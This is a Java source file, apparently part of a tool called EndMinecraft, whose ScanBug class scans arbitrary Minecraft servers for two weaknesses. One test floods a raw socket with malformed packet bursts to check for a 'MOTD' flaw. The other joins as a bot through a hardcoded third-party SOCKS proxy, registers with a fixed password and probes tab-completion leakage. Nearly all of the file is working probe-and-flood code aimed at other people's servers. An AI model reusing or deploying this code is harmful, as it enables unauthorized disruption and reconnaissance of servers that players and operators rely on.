package me.alikomi.endminecraft.tasks.scan;

import me.alikomi.endminecraft.Main;
import me.alikomi.endminecraft.utils.Util;
import org.spacehq.mc.protocol.MinecraftProtocol;
import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
import org.spacehq.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerChatPacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import org.spacehq.mc.protocol.packet.ingame.server.ServerTabCompletePacket;
import org.spacehq.packetlib.Client;
import org.spacehq.packetlib.event.session.*;
import org.spacehq.packetlib.tcp.TcpSessionFactory;

import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;

public class ScanBug extends Util {
    private static boolean reTab = false;

    public static void scanMOTD(String ip, int port) {
        boolean con = false;
        log("正在进行MOTD漏洞扫描，请等待");
        try {
            final Socket socket = new Socket();
            log("正在连接...");
            socket.connect(new InetSocketAddress(ip, port));
            if (socket.isConnected()) log("连接成功");
            con = true;
            final byte[] head = new byte[]{0x07, 0x00, 0x04, 0x01, 0x30, 0x63, (byte) 0xDD, 0x01};
            if (socket.isConnected() && !socket.isClosed()) {
                final OutputStream out = socket.getOutputStream();
                out.write(head);
                out.flush();
                for (int iq = 0; iq < 10; iq++) {
                    Thread.sleep(250);
                    log("第 " + iq + "次发包,共10次");
                    for (int i = 0; i < 10; i++) {
                        out.write(new byte[]{0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00});
                    }
                    out.flush();
                    for (int i = 0; i < 10; i++) {
                        out.write(new byte[]{0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00});
                    }
                    out.flush();
                }
            }
            socket.close();
            log("发包成功，发现motd漏洞");
            Main.bugData.setMotdBug(true);
        } catch (final Exception ignored) {
            if (con) {
                log("无MOTD漏洞");
            } else {
                log("服务器连接失败");
            }
        }
    }

    public static void scanTAB(String ip, int port) {
        MinecraftProtocol mc = new MinecraftProtocol("KoMiTest");
        //final Proxy p = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("127.0.0.1", 1080));
        final Client client = new Client(ip, port, mc, new TcpSessionFactory(new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("home.alikomi.me", 10086))));
        log("正在扫描TAB漏洞，请稍后");
        log("正在连接服务器");
        client.getSession().addListener(new SessionListener() {

            public void packetReceived(PacketReceivedEvent packetReceivedEvent) {
                if (packetReceivedEvent.getPacket() instanceof ServerChatPacket) {
                    System.out.println(packetReceivedEvent.getPacket().toString());
                    System.out.println(((ServerChatPacket) packetReceivedEvent.getPacket()).getMessage());
                }

                if (packetReceivedEvent.getPacket() instanceof ServerJoinGamePacket) {

                    client.getSession().send(new ClientChatPacket("/register qwnmopzx123 qwnmopzx123"));
                    client.getSession().send(new ClientChatPacket("/login qwnmopzx123"));

                    client.getSession().send(new ClientTabCompletePacket("/"));

                    log("TAB包发送成功！正在等待返回");
                    new Thread(() -> {
                        try {
                            Thread.sleep(3000);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        if (reTab) {
                            log("存在TAB漏洞！");
                        }else {
                            log("TAB漏洞不存在!");
                        }
                        //client.getSession().disconnect("TAB检测完毕，断开连接");
                    }).start();
                    log("服务器连接成功，正在扫描");
                }

                if (packetReceivedEvent.getPacket() instanceof ServerTabCompletePacket) {
                    reTab = true;
                    log("收到服务器返回TAB包");
                    log("长度为：");
                    log(((ServerTabCompletePacket) packetReceivedEvent.getPacket()).getMatches().length);
                    Main.bugData.setTabBug(true);
                }
            }

            public void packetSent(PacketSentEvent packetSentEvent) {

            }

            public void connected(ConnectedEvent connectedEvent) {

            }

            public void disconnecting(DisconnectingEvent disconnectingEvent) {

            }

            public void disconnected(DisconnectedEvent disconnectedEvent) {
                System.out.println(disconnectedEvent.getReason());
            }
        });
        client.getSession().connect();
        try {
            Thread.sleep(3700);
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

}
